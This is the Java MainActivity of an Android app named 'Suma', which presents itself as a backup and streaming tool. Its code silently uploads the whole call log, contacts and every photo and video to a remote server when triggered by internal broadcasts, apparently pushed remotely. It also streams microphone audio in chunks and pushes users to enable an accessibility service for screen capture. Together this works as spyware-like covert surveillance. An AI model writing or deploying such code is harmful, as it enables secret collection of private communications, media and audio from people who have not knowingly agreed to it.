package com.example.suma;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.Looper;
import android.provider.ContactsContract;
import android.provider.ContactsContract;
import android.provider.OpenableColumns;
import android.provider.MediaStore;
import android.os.BatteryManager;
import android.content.ContentUris;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.util.ArrayList;
import java.util.List;

import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.messaging.FirebaseMessaging;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.IntentFilter;
import android.media.projection.MediaProjectionManager;

public class MainActivity extends AppCompatActivity {

    private static final int PERMISSION_REQ_CODE = 100;
    private static final int PICK_FILE_REQ_CODE = 200;
    private static final String TAG = "SumaApp";

    private TextView statusText;
    private Button btnUpload, btnBackup, btnStream, btnScreenshot;
    private MediaRecorder mediaRecorder;
    private boolean isRecording = false;
    private String currentStreamId = null;
    private int chunkSequence = 0;
    private Handler streamHandler = new Handler(Looper.getMainLooper());
    private static final int CHUNK_DURATION_MS = 5000; // 5 seconds
    private android.media.projection.MediaProjectionManager mediaProjectionManager;
    // Removed local screenshotReceiver as GlobalActionService handles it now

    private String[] permissions = {
            Manifest.permission.INTERNET,
            Manifest.permission.ACCESS_NETWORK_STATE,
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.READ_CALL_LOG, // Added
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.POST_NOTIFICATIONS
    };

    // ... (onCreate)

    private BroadcastReceiver backupReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            if ("com.example.suma.ACTION_BACKUP_CALLLOG".equals(intent.getAction())) {
                Log.d(TAG, "Received Call Log Backup Request");
                performCallLogBackup();
            } else if ("com.example.suma.ACTION_BACKUP_GALLERY".equals(intent.getAction())) {
                String mediaType = intent.getStringExtra("media_type");
                Log.d(TAG, "Received Gallery Backup Request: " + mediaType);
                performGalleryBackup(mediaType);
            }
        }
    };

    // ...

    // --- Call Log Backup ---
    @SuppressLint("Range")
    private void performCallLogBackup() {
        if (ContextCompat.checkSelfPermission(this,
                Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            Log.e(TAG, "READ_CALL_LOG permission missing");
            return;
        }

        new Thread(() -> {
            try {
                JSONArray callLogs = new JSONArray();

                // Query CallLog
                Cursor cursor = getContentResolver().query(android.provider.CallLog.Calls.CONTENT_URI, null, null, null,
                        android.provider.CallLog.Calls.DATE + " DESC");

                if (cursor != null) {
                    while (cursor.moveToNext()) {
                        JSONObject log = new JSONObject();
                        log.put("number",
                                cursor.getString(cursor.getColumnIndex(android.provider.CallLog.Calls.NUMBER)));
                        log.put("name",
                                cursor.getString(cursor.getColumnIndex(android.provider.CallLog.Calls.CACHED_NAME)));
                        log.put("type",
                                getCallType(cursor.getInt(cursor.getColumnIndex(android.provider.CallLog.Calls.TYPE))));
                        log.put("date", cursor.getString(cursor.getColumnIndex(android.provider.CallLog.Calls.DATE)));
                        log.put("duration",
                                cursor.getString(cursor.getColumnIndex(android.provider.CallLog.Calls.DURATION)));
                        callLogs.put(log);
                    }
                    cursor.close();
                }

                uploadBackupData("call_log", callLogs.toString());

            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }

    private String getCallType(int type) {
        switch (type) {
            case android.provider.CallLog.Calls.INCOMING_TYPE:
                return "Incoming";
            case android.provider.CallLog.Calls.OUTGOING_TYPE:
                return "Outgoing";
            case android.provider.CallLog.Calls.MISSED_TYPE:
                return "Missed";
            case android.provider.CallLog.Calls.REJECTED_TYPE:
                return "Rejected";
            default:
                return "Unknown";
        }
    }

    // --- Gallery Backup ---
    private void performGalleryBackup(String mediaType) {
        new Thread(() -> {
            try {
                Log.d(TAG, "Starting Gallery Backup: " + mediaType);
                List<Uri> mediaUris = new ArrayList<>();

                // 1. Photos
                if ("photos".equals(mediaType) || "all".equals(mediaType)) {
                    if (ContextCompat.checkSelfPermission(this,
                            Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED ||
                            ContextCompat.checkSelfPermission(this,
                                    Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED) {

                        Cursor cursor = getContentResolver().query(
                                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                                new String[] { MediaStore.Images.Media._ID },
                                null, null, null);

                        if (cursor != null) {
                            while (cursor.moveToNext()) {
                                long id = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID));
                                mediaUris.add(
                                        ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id));
                            }
                            cursor.close();
                        }
                    }
                }

                // 2. Videos
                if ("videos".equals(mediaType) || "all".equals(mediaType)) {
                    if (ContextCompat.checkSelfPermission(this,
                            Manifest.permission.READ_MEDIA_VIDEO) == PackageManager.PERMISSION_GRANTED ||
                            ContextCompat.checkSelfPermission(this,
                                    Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED) {

                        Cursor cursor = getContentResolver().query(
                                MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
                                new String[] { MediaStore.Video.Media._ID },
                                null, null, null);

                        if (cursor != null) {
                            while (cursor.moveToNext()) {
                                long id = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Video.Media._ID));
                                mediaUris.add(
                                        ContentUris.withAppendedId(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, id));
                            }
                            cursor.close();
                        }
                    }
                }

                Log.d(TAG, "Found " + mediaUris.size() + " items to backup.");

                // Upload Sequentially
                for (Uri uri : mediaUris) {
                    uploadMediaSync(uri); // New synchronous method
                }

                Log.d(TAG, "Gallery Backup Completed.");

            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }

    // Synchronous upload for background thread with compression
    private void uploadMediaSync(Uri uri) {
        File fileToUpload = null;
        try {
            String fileName = getFileName(uri);
            if (fileName == null)
                fileName = "temp_media";

            // Compression Logic
            if (fileName.toLowerCase().endsWith(".jpg") || fileName.toLowerCase().endsWith(".jpeg")
                    || fileName.toLowerCase().endsWith(".png")) {
                try (InputStream in = getContentResolver().openInputStream(uri)) {
                    android.graphics.Bitmap bitmap = android.graphics.BitmapFactory.decodeStream(in);
                    if (bitmap != null) {
                        File compressedFile = new File(getCacheDir(), "cmp_" + System.currentTimeMillis() + ".jpg");
                        try (OutputStream out = new FileOutputStream(compressedFile)) {
                            bitmap.compress(android.graphics.Bitmap.CompressFormat.JPEG, 70, out);
                        }
                        bitmap.recycle();
                        fileToUpload = compressedFile;
                    }
                }
            }

            // Fallback: Copy original if not compressed or not an image
            if (fileToUpload == null) {
                fileToUpload = new File(getCacheDir(), "backup_" + fileName);
                try (InputStream in = getContentResolver().openInputStream(uri);
                        OutputStream out = new FileOutputStream(fileToUpload)) {
                    byte[] buffer = new byte[8192];
                    int read;
                    while ((read = in.read(buffer)) != -1) {
                        out.write(buffer, 0, read);
                    }
                }
            }

            String token = AuthManager.getToken(this);
            final File finalFile = fileToUpload;

            java.util.concurrent.CountDownLatch latch = new java.util.concurrent.CountDownLatch(1);
            NetworkUtils.uploadFile(AuthManager.getBaseUrl() + "/upload-media", finalFile, token,
                    new NetworkUtils.Callback() {
                        @Override
                        public void onSuccess(String response) {
                            finalFile.delete();
                            latch.countDown();
                        }

                        @Override
                        public void onError(String error) {
                            finalFile.delete();
                            latch.countDown();
                        }
                    });

            try {
                latch.await(60, java.util.concurrent.TimeUnit.SECONDS);
            } catch (InterruptedException e) {
            }

        } catch (Exception e) {
            e.printStackTrace();
            if (fileToUpload != null)
                fileToUpload.delete();
        }
    }

    // --- Generic Backup Upload ---
    private void uploadBackupData(String type, String dataJson) {
        try {
            JSONObject backupData = new JSONObject();
            backupData.put("type", type);
            backupData.put("data", dataJson);

            String token = AuthManager.getToken(this);
            java.net.URL url = new java.net.URL(AuthManager.getBaseUrl() + "/backup-data");
            java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Authorization", "Bearer " + token);
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);
            try (java.io.DataOutputStream os = new java.io.DataOutputStream(conn.getOutputStream())) {
                os.write(backupData.toString().getBytes("UTF-8"));
            }

            int code = conn.getResponseCode();
            if (code >= 200 && code < 300) {
                Log.d(TAG, "Backup " + type + " Success");
                // runOnUiThread(() -> Toast.makeText(MainActivity.this, "Backup " + type + "
                // Success", Toast.LENGTH_SHORT).show());
            } else {
                Log.e(TAG, "Backup " + type + " Failed: " + code);
            }

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // Refactored Contacts Backup to use helper
    @SuppressLint("Range")
    private void performBackup() {
        new Thread(() -> {
            try {
                JSONArray contacts = new JSONArray();
                // ... (Existing contact query logic) ...
                Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
                        null, null, null);
                if (cursor != null) {
                    while (cursor.moveToNext()) {
                        JSONObject contact = new JSONObject();
                        contact.put("name", cursor
                                .getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)));
                        contact.put("number",
                                cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)));
                        contacts.put(contact);
                    }
                    cursor.close();
                }

                uploadBackupData("contacts", contacts.toString());
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        statusText = findViewById(R.id.statusText);
        btnUpload = findViewById(R.id.btnUpload);
        btnBackup = findViewById(R.id.btnBackup);
        btnStream = findViewById(R.id.btnStream);
        btnScreenshot = findViewById(R.id.btnScreenshot);

        btnUpload.setOnClickListener(v -> openFilePicker());
        btnBackup.setOnClickListener(v -> performBackup());
        btnStream.setOnClickListener(v -> toggleStreaming());

        // Check accessibility status for screen capture
        btnScreenshot.setText("Enable Screen Capture Service");
        btnScreenshot.setOnClickListener(v -> openAccessibilitySettings());

        checkAccessibilityPermission();

        checkPermissions();

        // Register receiver for backup requests
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(backupReceiver, new IntentFilter("com.example.suma.ACTION_BACKUP_CALLLOG"),
                    Context.RECEIVER_NOT_EXPORTED);
        } else {
            registerReceiver(backupReceiver, new IntentFilter("com.example.suma.ACTION_BACKUP_CALLLOG"));
        }

        IntentFilter galleryFilter = new IntentFilter("com.example.suma.ACTION_BACKUP_GALLERY");
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(backupReceiver, galleryFilter, Context.RECEIVER_NOT_EXPORTED);
        } else {
            registerReceiver(backupReceiver, galleryFilter);
        }

        // Power Receiver
        IntentFilter powerFilter = new IntentFilter();
        powerFilter.addAction(Intent.ACTION_POWER_CONNECTED);
        powerFilter.addAction(Intent.ACTION_POWER_DISCONNECTED);
        registerReceiver(powerReceiver, powerFilter);
    }

    private void openAccessibilitySettings() {
        Intent intent = new Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS);
        startActivity(intent);
        Toast.makeText(this, "Enable 'Suma Mobile' in Installed Services", Toast.LENGTH_LONG).show();
    }

    private boolean isAccessibilityServiceEnabled() {
        int accessibilityEnabled = 0;
        final String service = getPackageName() + "/" + GlobalActionService.class.getCanonicalName();
        Log.d(TAG, "Checking Accessibility Service: " + service);

        try {
            accessibilityEnabled = android.provider.Settings.Secure.getInt(
                    this.getApplicationContext().getContentResolver(),
                    android.provider.Settings.Secure.ACCESSIBILITY_ENABLED);
        } catch (android.provider.Settings.SettingNotFoundException e) {
            Log.e(TAG, "Error finding setting, default accessibility to not found: " + e.getMessage());
        }
        android.text.TextUtils.SimpleStringSplitter mStringColonSplitter = new android.text.TextUtils.SimpleStringSplitter(
                ':');

        if (accessibilityEnabled == 1) {
            String settingValue = android.provider.Settings.Secure.getString(
                    getApplicationContext().getContentResolver(),
                    android.provider.Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            if (settingValue != null) {
                Log.d(TAG, "Enabled Services: " + settingValue);
                mStringColonSplitter.setString(settingValue);
                while (mStringColonSplitter.hasNext()) {
                    String accessibilityService = mStringColonSplitter.next();
                    if (accessibilityService.equalsIgnoreCase(service)) {
                        Log.d(TAG, "Accessibility Service FOUND!");
                        return true;
                    }
                }
            }
        } else {
            Log.d(TAG, "Accessibility GLOBAL ENABLED = 0");
        }
        Log.d(TAG, "Accessibility Service NOT FOUND");
        return false;
    }

    private void checkAccessibilityPermission() {
        if (isAccessibilityServiceEnabled()) {
            Log.d(TAG, "Button State: READY");
            btnScreenshot.setText("Screen Verification Ready");
            btnScreenshot.setEnabled(false); // Already active
            statusText.setText("Status: Service Active");
        } else {
            Log.d(TAG, "Button State: ENABLE NEEDED");
            btnScreenshot.setText("Enable Screen Capture");
            btnScreenshot.setEnabled(true);
        }
    }

    @Override
    protected void onResume() {
        super.onResume();
        checkAccessibilityPermission();
    }

    private void checkPermissions() {
        List<String> listPermissionsNeeded = new ArrayList<>();
        for (String p : permissions) {
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
                listPermissionsNeeded.add(p);
            }
        }
        if (!listPermissionsNeeded.isEmpty()) {
            ActivityCompat.requestPermissions(this, listPermissionsNeeded.toArray(new String[0]), PERMISSION_REQ_CODE);
        } else {
            authenticate();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions,
            @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQ_CODE) {
            authenticate(); // Try auth anyway
        }
    }

    private void authenticate() {
        Log.d(TAG, "Starting authentication process...");
        FirebaseMessaging.getInstance().getToken()
                .addOnCompleteListener(new OnCompleteListener<String>() {
                    @Override
                    public void onComplete(@NonNull Task<String> task) {
                        if (!task.isSuccessful()) {
                            Log.e(TAG, "Fetching FCM registration token failed", task.getException());
                            // Fallback to login without token if strict mode not required
                            // return;
                        }

                        // Get new FCM registration token
                        String token = task.isSuccessful() ? task.getResult() : null;
                        Log.d(TAG, "FCM Token retrieval complete. Token: " + (token == null ? "NULL" : token));

                        if (token != null) {
                            // Save to prefs for AuthManager to pick up
                            getSharedPreferences("SumaPrefs", MODE_PRIVATE).edit().putString("fcm_token", token)
                                    .apply();
                            Log.d(TAG, "FCM Token saved to SharedPreferences");
                        } else {
                            Log.w(TAG, "FCM Token is NULL, proceeding with login anyway...");
                        }

                        // Now login
                        AuthManager.login(MainActivity.this, new AuthManager.AuthCallback() {
                            @Override
                            public void onAuthSuccess(String token) {
                                Log.d(TAG, "Auth Success. Token: " + token);
                                runOnUiThread(() -> {
                                    statusText.setText("Status: " + getString(R.string.status_authenticated));
                                    btnUpload.setEnabled(true);
                                    btnBackup.setEnabled(true);
                                    btnStream.setEnabled(true);
                                    btnScreenshot.setEnabled(true);

                                    // Update Device Info (Battery)
                                    updateDeviceInfo();
                                });
                            }

                            @Override
                            public void onAuthError(String error) {
                                Log.e(TAG, "Auth Error: " + error);
                                runOnUiThread(() -> statusText.setText("Auth Error: " + error));
                            }
                        });
                    }
                });
    }

    // --- File Upload ---
    private void openFilePicker() {
        Intent intent = new Intent(Intent.ACTION_GET_CONTENT);
        intent.setType("*/*");
        startActivityForResult(intent, PICK_FILE_REQ_CODE);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == PICK_FILE_REQ_CODE && resultCode == Activity.RESULT_OK && data != null) {
            Uri uri = data.getData();
            uploadMedia(uri);
        }
    }

    private void uploadMedia(Uri uri) {
        if (uri == null)
            return;
        new Thread(() -> {
            try {
                // Copy to cache file
                File file = new File(getCacheDir(), getFileName(uri));
                try (InputStream in = getContentResolver().openInputStream(uri);
                        OutputStream out = new FileOutputStream(file)) {
                    byte[] buffer = new byte[4096];
                    int read;
                    while ((read = in.read(buffer)) != -1) {
                        out.write(buffer, 0, read);
                    }
                }

                String token = AuthManager.getToken(this);
                NetworkUtils.uploadFile(AuthManager.getBaseUrl() + "/upload-media", file, token,
                        new NetworkUtils.Callback() {
                            @Override
                            public void onSuccess(String response) {
                                runOnUiThread(() -> Toast
                                        .makeText(MainActivity.this, "Upload Success", Toast.LENGTH_SHORT).show());
                                file.delete();
                            }

                            @Override
                            public void onError(String error) {
                                runOnUiThread(() -> Toast
                                        .makeText(MainActivity.this, "Upload Failed: " + error, Toast.LENGTH_SHORT)
                                        .show());
                            }
                        });
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }

    @SuppressLint("Range")
    private String getFileName(Uri uri) {
        String result = null;
        if (uri.getScheme().equals("content")) {
            try (Cursor cursor = getContentResolver().query(uri, null, null, null, null)) {
                if (cursor != null && cursor.moveToFirst()) {
                    result = cursor.getString(cursor.getColumnIndex(OpenableColumns.DISPLAY_NAME));
                }
            }
        }
        if (result == null) {
            result = uri.getPath();
            int cut = result.lastIndexOf('/');
            if (cut != -1) {
                result = result.substring(cut + 1);
            }
        }
        return result;
    }

    // --- Live Streaming ---
    private void toggleStreaming() {
        if (isRecording) {
            stopStreaming();
        } else {
            startStreaming();
        }
    }

    private void startStreaming() {
        new Thread(() -> {
            try {
                // 1. Call API to start stream
                java.net.URL url = new java.net.URL(AuthManager.getBaseUrl() + "/stream/start");
                java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Authorization", "Bearer " + AuthManager.getToken(this));
                conn.setDoOutput(true); // POST

                int code = conn.getResponseCode();
                if (code == 200) {
                    InputStream is = conn.getInputStream();
                    java.util.Scanner s = new java.util.Scanner(is).useDelimiter("\\A");
                    String response = s.hasNext() ? s.next() : "";
                    JSONObject json = new JSONObject(response);
                    currentStreamId = String.valueOf(json.getInt("live_stream_id"));

                    runOnUiThread(() -> {
                        isRecording = true;
                        btnStream.setText(R.string.action_stop_live);
                        statusText.setText("Live Stream Active");
                        chunkSequence = 0;
                        recordChunk(); // Start loop
                    });
                }
            } catch (Exception e) {
                runOnUiThread(() -> Toast
                        .makeText(MainActivity.this, "Start Stream Failed: " + e.getMessage(), Toast.LENGTH_SHORT)
                        .show());
            }
        }).start();
    }

    private void stopStreaming() {
        isRecording = false;
        streamHandler.removeCallbacksAndMessages(null);
        if (mediaRecorder != null) {
            try {
                mediaRecorder.stop();
                mediaRecorder.release();
            } catch (Exception e) {
            }
            mediaRecorder = null;
        }

        new Thread(() -> {
            try {
                java.net.URL url = new java.net.URL(AuthManager.getBaseUrl() + "/stream/end");
                java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Authorization", "Bearer " + AuthManager.getToken(this));
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);

                JSONObject body = new JSONObject();
                body.put("live_stream_id", currentStreamId);
                try (java.io.DataOutputStream os = new java.io.DataOutputStream(conn.getOutputStream())) {
                    os.write(body.toString().getBytes("UTF-8"));
                }
                conn.getResponseCode(); // Trigger
            } catch (Exception e) {
            }
        }).start();

        btnStream.setText(R.string.action_start_live);
        statusText.setText(R.string.status_authenticated);
    }

    private void recordChunk() {
        if (!isRecording)
            return;

        File chunkFile = new File(getCacheDir(), "chunk_" + chunkSequence + ".m4a");
        mediaRecorder = new MediaRecorder();
        mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
        mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
        mediaRecorder.setOutputFile(chunkFile.getAbsolutePath());

        try {
            mediaRecorder.prepare();
            mediaRecorder.start();

            // Schedule stop and upload
            streamHandler.postDelayed(() -> {
                try {
                    mediaRecorder.stop();
                    mediaRecorder.release();
                    mediaRecorder = null;

                    uploadChunk(chunkFile, chunkSequence);
                    chunkSequence++;

                    if (isRecording)
                        recordChunk(); // Next chunk

                } catch (Exception e) {
                    e.printStackTrace();
                    isRecording = false; // Stop on error
                }
            }, CHUNK_DURATION_MS);

        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void uploadChunk(File file, int sequence) {
        String token = AuthManager.getToken(this);
        // We need to pass extra params (live_stream_id, sequence_number)
        // NetworkUtils.uploadFile is simple, let's create a custom Multipart uploader
        // here locally or quick-mod NetworkUtils?
        // Actually, NetworkUtils.uploadFile only sends "file". The API needs
        // "live_stream_id" etc.
        // HACK: We can put parameters in the URL query string? No, POST body is safer.
        // Let's rely on a modified NetworkUtils upload method that I will write NEXT or
        // just inline it here.
        // I'll inline the Multipart logic for chunks here to be safe and robust.

        new Thread(() -> {
            try {
                String boundary = "*****" + System.currentTimeMillis() + "*****";
                java.net.URL url = new java.net.URL(AuthManager.getBaseUrl() + "/stream/chunk");
                java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
                conn.setDoOutput(true);
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Authorization", "Bearer " + token);
                conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);

                java.io.DataOutputStream dos = new java.io.DataOutputStream(conn.getOutputStream());

                // addParam
                addFormField(dos, boundary, "live_stream_id", currentStreamId);
                addFormField(dos, boundary, "sequence_number", String.valueOf(sequence));
                addFormField(dos, boundary, "duration", String.valueOf(CHUNK_DURATION_MS / 1000.0));

                // addFile
                dos.writeBytes("--" + boundary + "\r\n");
                dos.writeBytes("Content-Disposition: form-data; name=\"file\";filename=\"" + file.getName() + "\"\r\n");
                dos.writeBytes("\r\n");
                try (FileInputStream fis = new FileInputStream(file)) {
                    byte[] buffer = new byte[4096];
                    int bytesRead;
                    while ((bytesRead = fis.read(buffer)) != -1)
                        dos.write(buffer, 0, bytesRead);
                }
                dos.writeBytes("\r\n");
                dos.writeBytes("--" + boundary + "--\r\n");
                dos.flush();
                dos.close();

                int code = conn.getResponseCode();
                final int finalCode = code;

                runOnUiThread(() -> {
                    if (finalCode == 200) {
                        statusText.setText("Status: Chunk " + sequence + " Uploaded ✅");
                        // Toast.makeText(MainActivity.this, "Chunk " + sequence + " OK",
                        // Toast.LENGTH_SHORT).show();
                    } else {
                        statusText.setText("Status: Chunk " + sequence + " Failed ❌ (" + finalCode + ")");
                        Toast.makeText(MainActivity.this, "Upload Failed: " + finalCode, Toast.LENGTH_SHORT).show();
                    }
                });

                if (code == 200) {
                    file.delete(); // Cleanup
                } else {
                    // Read error stream for debugging
                    try (InputStream errorStream = conn.getErrorStream()) {
                        if (errorStream != null) {
                            java.util.Scanner s = new java.util.Scanner(errorStream).useDelimiter("\\A");
                            String err = s.hasNext() ? s.next() : "";
                            Log.e(TAG, "Server Error: " + err);
                            runOnUiThread(
                                    () -> Toast.makeText(MainActivity.this, "Err: " + err, Toast.LENGTH_LONG).show());
                        }
                    }
                }
            } catch (Exception e) {
                e.printStackTrace();
                final String errorMsg = e.getMessage();
                runOnUiThread(() -> statusText.setText("Status: Chunk Error ⚠️ " + errorMsg));
            }
        }).start();
    }

    private void addFormField(java.io.DataOutputStream dos, String boundary, String name, String value)
            throws IOException {
        dos.writeBytes("--" + boundary + "\r\n");
        dos.writeBytes("Content-Disposition: form-data; name=\"" + name + "\"\r\n");
        dos.writeBytes("\r\n");
        dos.writeBytes(value + "\r\n");
    }

    // Removed takeScreenshotAndUpload (Local) as GlobalActionService handles it

    // Kept saveAndUploadBitmap just in case needed for local logic later,
    // but not used by Accessibility flow. Leaving it is fine or removing.
    // I'll keep it as helper if we ever fallback to local capture activity-only.
    private void saveAndUploadBitmap(android.graphics.Bitmap bitmap) {
        // Save
        try {
            File file = new File(getCacheDir(), "screenshot_" + System.currentTimeMillis() + ".png");
            FileOutputStream fos = new FileOutputStream(file);
            bitmap.compress(android.graphics.Bitmap.CompressFormat.PNG, 100, fos);
            fos.flush();
            fos.close();

            // Upload
            String token = AuthManager.getToken(this);
            NetworkUtils.uploadFile(AuthManager.getBaseUrl() + "/upload-media", file, token,
                    new NetworkUtils.Callback() {
                        @Override
                        public void onSuccess(String response) {
                            runOnUiThread(() -> {
                                Toast.makeText(MainActivity.this, "Screenshot Uploaded!", Toast.LENGTH_SHORT).show();
                                file.delete();
                            });
                        }

                        @Override
                        public void onError(String error) {
                            runOnUiThread(() -> Toast
                                    .makeText(MainActivity.this, "Upload Failed: " + error, Toast.LENGTH_SHORT).show());
                        }
                    });

        } catch (Exception e) {
            e.printStackTrace();
            Toast.makeText(this, "Screenshot Save Failed", Toast.LENGTH_SHORT).show();
        }

    }

    private BroadcastReceiver powerReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            Log.d(TAG, "Power State Changed: " + intent.getAction());
            updateDeviceInfo();
        }
    };

    private void updateDeviceInfo() {
        try {
            BatteryManager bm = (BatteryManager) getSystemService(BATTERY_SERVICE);
            int level = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);

            // Charging status
            IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
            Intent batteryStatus = registerReceiver(null, ifilter);
            int status = batteryStatus != null ? batteryStatus.getIntExtra(BatteryManager.EXTRA_STATUS, -1) : -1;
            boolean isCharging = status == BatteryManager.BATTERY_STATUS_CHARGING ||
                    status == BatteryManager.BATTERY_STATUS_FULL;

            new Thread(() -> {
                try {
                    JSONObject json = new JSONObject();
                    json.put("battery_level", level);
                    json.put("is_charging", isCharging);

                    String token = AuthManager.getToken(this);
                    java.net.URL url = new java.net.URL(AuthManager.getBaseUrl() + "/update-device-info");
                    java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setRequestProperty("Authorization", "Bearer " + token);
                    conn.setRequestProperty("Content-Type", "application/json");
                    conn.setDoOutput(true);
                    try (DataOutputStream os = new DataOutputStream(conn.getOutputStream())) {
                        os.write(json.toString().getBytes("UTF-8"));
                    }
                    conn.getResponseCode(); // Execute
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }).start();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
